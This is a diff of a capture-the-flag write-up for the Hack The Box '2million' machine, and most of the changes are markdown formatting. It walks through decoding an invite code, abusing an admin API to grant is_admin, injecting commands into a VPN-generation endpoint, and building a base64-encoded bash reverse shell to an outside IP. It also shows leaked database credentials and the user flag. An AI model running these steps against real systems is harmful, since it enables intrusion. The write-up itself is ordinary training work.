@@ -66,32 +66,35 @@ Upgrade-Insecure-Requests: 1
 
 code=&username=user&email=user%40htb.com&password=user&password_confirmation=user
 ```
-
+### Curl 
+```
 curl -sX POST http://2million.htb/api/v1/invite/how/to/generate 
 {"0":200,"success":1,"data":{"data":"Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr","enctype":"ROT13"},"hint":"Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."}
+```
 
 you got a ROT13-decoded message says : In order to generate the invite code, make a POST request to /api/v1/invite/generate
-
+```
 curl -sX POST http://2million.htb/api/v1/invite/generate
 {"0":200,"success":1,"data":{"code":"N1ZQVDQtSTRGTTQtTjNRM0stMktJOUc=","format":"encoded"}}  
+```
 
-it is base64 decoded invitation code  => echo N1ZQVDQtSTRGTTQtTjNRM0stMktJOUc= | base64 -d => 7VPT4-I4FM4-N3Q3K-2KI9G 
+it is base64 decoded invitation code  => `echo N1ZQVDQtSTRGTTQtTjNRM0stMktJOUc= | base64 -d` => `7VPT4-I4FM4-N3Q3K-2KI9G` 
 
 Use the invitation code to register an account
 
-code=7VPT4-I4FM4-N3Q3K-2KI9G&username=user&email=user%40htb.com&password=user&password_confirmation=user
+`code=7VPT4-I4FM4-N3Q3K-2KI9G&username=user&email=user%40htb.com&password=user&password_confirmation=user`
 
-GET the PHPSESSID from your browser => 0u8rjqr7pid9s7m2eaoavcjecu
-
+GET the `PHPSESSID` from your browser => `0u8rjqr7pid9s7m2eaoavcjecu`
+```
 curl -sv 2million.htb/api --cookie "PHPSESSID=0u8rjqr7pid9s7m2eaoavcjecu" | jq
+```
 
-curl -sv 2million.htb/api/v1 --cookie "PHPSESSID=0u8rjqr7pid9s7m2eaoavcjecu" | jq
 
 * Connection #0 to host 2million.htb left intact
 {
   "/api/v1": "Version 1 of the API"
 }
-
+```
 curl http://2million.htb/api/v1 --cookie "PHPSESSID=0u8rjqr7pid9s7m2eaoavcjecu" | jq 
 
 {
@@ -125,23 +128,27 @@ curl http://2million.htb/api/v1 --cookie "PHPSESSID=0u8rjqr7pid9s7m2eaoavcjecu" 
     }
   }
 }
+```
 
 You find all V1 data
 
+```
 curl -X PUT http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=0u8rjqr7pid9s7m2eaoavcjecu" --header "Content-Type: application/json" | jq
 
 {
   "status": "danger",
   "message": "Missing parameter: email"
 }
-
+```
+```
 curl -X PUT http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=0u8rjqr7pid9s7m2eaoavcjecu" --header "Content-Type: application/json" --data '{"email":"user@htb.com"}' | jq
 
 {
   "status": "danger",
   "message": "Missing parameter: is_admin"
 }
-
+```
+```
 curl -X PUT http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=0u8rjqr7pid9s7m2eaoavcjecu" --header "Content-Type: application/json" --data '{"email":"user@htb.com", "is_admin": '1'}' | jq 
 
 {
@@ -149,14 +156,19 @@ curl -X PUT http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID
   "username": "user",
   "is_admin": 1
 }
+```
 
-if you now try curl http://2million.htb/api/v1/admin/auth --cookie "PHPSESSID=0u8rjqr7pid9s7m2eaoavcjecu" | jq
+if you now try `curl http://2million.htb/api/v1/admin/auth --cookie "PHPSESSID=0u8rjqr7pid9s7m2eaoavcjecu" | jq`
 
+```
 curl -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=0u8rjqr7pid9s7m2eaoavcjecu" --header "Content-Type: application/json" --data '{"username":"user"}'  
-
+```
+```
 curl -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=0u8rjqr7pid9s7m2eaoavcjecu" --header "Content-Type: application/json" --data '{"username":"user;id;"}'  
+```
 
-echo -n "bash -i >& /dev/tcp/10.10.14.48/1234 0>&1" | base64
+`echo -n "bash -i >& /dev/tcp/10.10.14.48/1234 0>&1" | base64`
+
 YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40OC8xMjM0IDA+JjE=
 
 DB_HOST=127.0.0.1
@@ -164,7 +176,7 @@ DB_DATABASE=htb_prod
 DB_USERNAME=admin
 DB_PASSWORD=SuperDuperPass123
 
-We find admin password 
+We find **admin password **
 ssh to admin with the password
 
 user flag => a2624f25c7983f33de70b88f7b290710
